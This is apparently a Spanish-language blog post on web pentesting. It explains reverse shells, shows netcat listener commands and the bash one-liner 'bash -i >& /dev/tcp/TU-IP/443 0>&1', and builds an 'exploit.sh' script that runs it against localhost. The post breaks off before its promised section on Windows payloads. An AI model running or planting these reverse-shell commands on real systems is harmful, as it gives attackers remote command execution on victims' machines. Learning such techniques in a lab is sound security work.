I"‚<h2> TE AMO LU ME AMAS?</h2>

<p><strong>Hola</strong> hoy estaermos hablando de pentesting web, hablaremos sobre:</p>
<ul>
  <li><strong>Creacion de ReverseShell comandos</strong></li>
  <li><strong>Como estan compuestos los payloads exploits malware para windows.</strong>
<br /></li>
</ul>

<p>Vale primero que es una <strong>ReverseShell</strong>, lo explicara en un lenguaje brusco, una ReverShell es aquella que te permite
ejecutar comandos en una pc que no es tu dominio, es decir una ip el cual es la de la victima conectada a un hosts,
donde el hosts es tu equipo y te permite ejecucion remota de comandos.</p>

<p><a href="https://www.google.com/search?q=ReverseShell&amp;client=firefox-b-d&amp;sxsrf=ALiCzsbKFcBidTADzj_JE7x-ksfIvwVUpA%3A1658946186694&amp;ei=ioLhYpz9KeezqtsPnd-L8A0&amp;ved=0ahUKEwic6qKR2Jn5AhXnmWoFHZ3vAt4Q4dUDCA0&amp;uact=5&amp;oq=ReverseShell&amp;gs_lcp=Cgdnd3Mtd2l6EAMyBwgjELECECcyBwgjELECECcyBwgjELECECcyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEM6BwgAEEcQsAM6BAguECc6BAgjECc6CwgAEIAEELEDEIMBOgcIIxDqAhAnOggIABCxAxCDAToFCAAQgAQ6BAgAEAM6BggjECcQEzoKCAAQsQMQgwEQQzoKCC4QsQMQgwEQQzoGCAAQChBDOggIABCABBCxAzoICC4QgAQQsQM6BwgAEIAEEAo6BwgAEAoQywE6BQgAEMsBSgQIQRgASgQIRhgAUM4EWPkxYJkzaAhwAXgBgAHzAYgBrBqSAQYwLjE0LjSYAQCgAQGwAQrIAQjAAQE&amp;sclient=gws-wiz">Puedes encontrar mas informacion aqui</a>.</p>

<hr />
<p><br /></p>

<h3>Empezaremos con las pruebas de ReverseShell:</h3>
<p>los programas a utilizar para la ReverseShell es bash, netcat, si usas linux es probable que ya tengas los tengas instalados, 
en el caso contrario ejecuta:
<br /></p>

<p>para linux:</p>

<p><code class="language-plaintext highlighter-rouge">sudo apt-get install netcat bash</code></p>

<p>para arch-linux:</p>

<p><code class="language-plaintext highlighter-rouge">pacman -Sy netcat bash</code></p>

<p><br />
<br /></p>

<h3>IMPORTANTE</h3>
<p>[*] Para estas bruebas si lo vas a hacer desde terminal, tienes que utilizar bash y no zsh por que te dara
errores, claro si quieres puedes probar de zsh y conocer los errores pero si quieres omitir esto, entonces solo ejecutas
el siguiente comando:</p>

<p><code class="language-plaintext highlighter-rouge">bash</code></p>

<p><img src="screenshots/screen_bash.jpg" /></p>

<p>Como puede ver ya no estoy en la zsh entonces vamos a operar desde la terminal y luego operaremos de un script mailicioso.</p>

<p><br /></p>

<p>[*] Empezamos poniendonos en escucha por el puerto 443 de netcat</p>

<p><code class="language-plaintext highlighter-rouge">nc -nvlp 443</code></p>

<p>Miramos que ip tenemos con el comando ifconfig :</p>

<p><code class="language-plaintext highlighter-rouge">ifconfig</code></p>

<p><img src="screenshots/ifconfig.jpg" /></p>

<p>Como pueden ver tengo la ip 127.0.0.1</p>

<p>ahora estando en escucha con netcat ‚Äúnc -nlvp 443‚Äù en el puerto 443, vamos a entablarnos la coneccion desde otra
terminal por que la primera esta siendo ocupada por netcat entonces recuerden ejecutar el comando <code class="language-plaintext highlighter-rouge">bash</code> antes de entablar
la coneccion.</p>

<p><br /></p>

<p>Para entablar la coneccion hacemos el siguiente comando</p>

<p><br />
<code class="language-plaintext highlighter-rouge">bash</code>
<code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/TU-IP/443/ 0&gt;&amp;1</code></p>

<p><img src="screenshots/reverse.jpg" /></p>

<p>Como pueden ver se me abrio un <strong>ReverseShell</strong> en la parte donde estaba en escucha con netcat.</p>

<hr />
<p><br /></p>

<p>Ahora pasaremos a desarrollar un <strong>script malicioso en bash</strong>, para ello aremos los mismo solo que esta ves el comando : 
<code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/127.0.0.1/443 0&gt;&amp;1</code> ira dentro de un script sh para ello:</p>

<p><br /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>touch exploit.sh &amp;&amp; echo -e "bash -i &amp;&gt;/dev/tcp/$(cat /etc/hosts  | grep localhost | awk "NR==1" | cut -d " " -f "1-1")/443 0&gt;&amp;1" &gt;&gt; exploit.sh &amp;&amp; chmod +x ./exploit.sh
</code></pre></div></div>

<p><br /></p>

<p>Lo que hice con ese comando fue hacer un script en bash para poder entablarme una coneccion pueden hacer <code class="language-plaintext highlighter-rouge">ls</code> y veran un
archivo llamado <strong>exploit.sh</strong> y de paso otorgarle permiso de ejecucion.</p>

<p><br />
No se ofusque si no entiende esa linea de codigo simplemente lo que hace es hacer un archivo darle permisos
de ejecucion y meterle adentro este codigo :</p>

<pre><code class="language-#!/bin/bash">   bash -i &gt;&amp; /dev/tcp/127.0.0.1 0&gt;&amp;1
</code></pre>
<p><br />
Pueden hacerlo manualmente con los siquientes comandos :</p>

<p><code class="language-plaintext highlighter-rouge">touch exploit.sh</code>
<code class="language-plaintext highlighter-rouge">chmod +x exploit.sh</code>
Abren el archivo creado y colocan la <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/SU-IP/443 0&gt;&amp;1</code></p>

<p><br /></p>

<p>Una vez ya tenido el archivo pueden ponerces en escucha por el puerto 443 con netcat
<code class="language-plaintext highlighter-rouge">nc -nlvp 443</code></p>

<p><br /></p>

<p>Y se ejecutan el archivo creado
<code class="language-plaintext highlighter-rouge">./exploit.sh</code></p>

<p><br /></p>

<p><img src="screenshots/final.jpg" /></p>

<p><strong>Ahora como puden ver tengo una reverse shell</strong></p>

<p><br /></p>

<p>Lo mas comodo de hacerlo por script es que se puden ejecutar el archivo teniendo la zsh y ahorrandose el comando <code class="language-plaintext highlighter-rouge">bash</code> y
ejecutar el archivo este se debe a la extension ‚Äúsh‚Äù que tiene el archivo.</p>

<hr />

<h3>Bueno veremos
</h3>
:ET